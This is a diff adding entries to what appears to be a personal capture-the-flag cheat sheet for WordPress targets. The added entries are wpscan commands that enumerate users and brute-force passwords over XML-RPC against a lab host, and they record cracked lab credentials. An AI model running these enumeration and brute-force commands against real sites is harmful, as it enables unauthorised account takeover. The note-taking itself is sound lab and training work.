@@ -25,3 +25,19 @@ Used on: **Internal** - found `admin:my2boys`.
 - [../../exploits/web-rce/wordpress-theme-editor-webshell.md](../../exploits/web-rce/wordpress-theme-editor-webshell.md)
 
 
+
+### Enumerate WordPress users
+
+```bash
+wpscan --url http://blog.thm --enumerate u
+```
+
+Used on: **blog** - recovered candidate usernames before XML-RPC brute force.
+
+### XML-RPC password attack
+
+```bash
+wpscan --url http://blog.thm --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/rockyou.txt -t 50
+```
+
+Used on: **blog** - found `kwheel:cutiepie1`.
